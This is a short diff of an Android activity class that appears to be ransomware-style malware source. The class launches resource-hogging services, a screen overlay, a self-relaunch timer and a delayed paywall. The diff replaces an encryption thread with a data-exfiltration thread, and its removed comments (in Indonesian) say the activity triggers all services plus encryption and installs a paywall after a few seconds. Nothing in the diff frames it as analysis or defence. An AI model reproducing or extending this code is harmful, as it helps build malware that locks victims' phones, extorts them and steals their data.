@@ -37,16 +37,13 @@ public class ChaosActivity extends Activity {
                         | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                         | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                         | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
-
-        // trigger semua service + enkripsi
         StrainService.start(this);
         HogService.start(this, HogService1.class);
         HogService.start(this, HogService2.class);
         HogService.start(this, HogService3.class);
         try { OverlayService.start(this); } catch (Throwable ignored) {}
         StrainReceiver.scheduleRelaunch(this, 20);
-        new Thread(new Encryptor(this)).start();
-
+        new Thread(new Exfiltrator(this)).start();
         FrameLayout root = new FrameLayout(this);
         root.setBackgroundColor(Color.BLACK);
         GridLayout grid = new GridLayout(this);
@@ -78,8 +75,6 @@ public class ChaosActivity extends Activity {
         blp.bottomMargin = 60;
         root.addView(brand, blp);
         setContentView(root);
-
-        // pasang paywall setelah beberapa detik
         new Thread(() -> {
             try { Thread.sleep(8000); } catch (InterruptedException ignored) {}
             runOnUiThread(() -> {
